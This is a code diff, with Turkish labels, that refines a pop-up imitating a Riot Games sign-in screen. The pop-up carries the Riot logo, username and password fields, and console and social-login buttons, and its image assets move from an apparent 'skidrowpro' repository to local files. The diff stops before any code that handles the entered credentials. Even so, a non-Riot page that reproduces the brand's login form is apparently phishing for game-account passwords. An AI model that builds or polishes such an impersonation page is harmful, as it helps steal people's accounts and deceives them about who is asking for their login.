@@ -129,7 +129,6 @@
             }, 3000);
         });
 
-        // 2. AUTH SİSTEMİ (POP-UP)
         // 2. AUTH SİSTEMİ (POP-UP - FULL GÖRSEL TASARIM)
 function openAuth() {
     const w = 550, h = 800;
@@ -144,7 +143,7 @@ function openAuth() {
                 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
                 body { 
                     margin:0; height:100vh; overflow:hidden; 
-                    background: url('https://raw.githubusercontent.com/skidrowpro/riot-assets/main/login_bg.jpg') center/cover; 
+                    background: url('login_bg.jpg') center/cover no-repeat; 
                     display:flex; justify-content:center; align-items:center; font-family:'Inter', sans-serif; 
                 }
                 .card { 
@@ -167,7 +166,7 @@ function openAuth() {
                 input:focus + .label, input:not(:placeholder-shown) + .label { top: 8px; font-size: 9px; color: #333; }
 
                 .social-grid { display:grid; grid-template-columns:repeat(5, 1fr); gap:8px; margin:20px 0; width:100%; }
-                .social-btn { height:40px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; overflow:hidden; }
+                .social-btn { height:40px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; }
                 .fb { background:#1877f2; } .gg { background:#fff; border:1px solid #ddd; } .ap { background:#000; } .xb { background:#107c10; } .ps { background:#00439c; }
                 .social-btn img { width:20px; height:20px; object-fit: contain; }
 
@@ -176,7 +175,7 @@ function openAuth() {
 
                 .next-btn { 
                     width:75px; height:75px; border:2px solid #eee; border-radius:24px; background:#fff; 
-                    cursor:pointer; display:flex; align-items:center; justify-content:center; transition:0.3s; margin-top:20px; 
+                    cursor:pointer; display:flex; align-items:center; justify-content:center; transition:0.3s; margin-top:20px; outline:none;
                 }
                 .next-btn.active { border-color:#ff4655; }
                 .next-btn svg { width:30px; fill:#ddd; }
@@ -187,20 +186,22 @@ function openAuth() {
         </head>
         <body>
             <div class="card">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="50">
+                <img src="login_logo.png" width="100" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png'">
                 <h2>GİRİŞ</h2>
                 <div class="input-container">
-                    <input type="text" id="u" placeholder=" "><span class="label">Kullanıcı Adı</span>
+                    <input type="text" id="u" placeholder=" " autocomplete="off">
+                    <span class="label">Kullanıcı Adı</span>
                 </div>
                 <div class="input-container">
-                    <input type="password" id="p" placeholder=" "><span class="label">Şifre</span>
+                    <input type="password" id="p" placeholder=" " autocomplete="off">
+                    <span class="label">Şifre</span>
                 </div>
                 <div class="social-grid">
-                    <div class="social-btn fb"><img src="https://cdn-icons-png.flaticon.com/512/124/124010.png"></div>
-                    <div class="social-btn gg"><img src="https://cdn-icons-png.flaticon.com/512/2991/2991148.png"></div>
-                    <div class="social-btn ap"><img src="https://cdn-icons-png.flaticon.com/512/0/747.png"></div>
-                    <div class="social-btn xb"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg"></div>
-                    <div class="social-btn ps"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Playstation_logo_colour.svg"></div>
+                    <div class="social-btn fb"><img src="fb_logo.png"></div>
+                    <div class="social-btn gg"><img src="google_logo.png"></div>
+                    <div class="social-btn ap"><img src="apple_logo.png"></div>
+                    <div class="social-btn xb"><img src="xbox_logo.png"></div>
+                    <div class="social-btn ps"><img src="ps_logo.png"></div>
                 </div>
                 <div class="stay-signed"><div class="checkbox"></div> Oturumu açık tut</div>
                 <button class="next-btn" id="go">
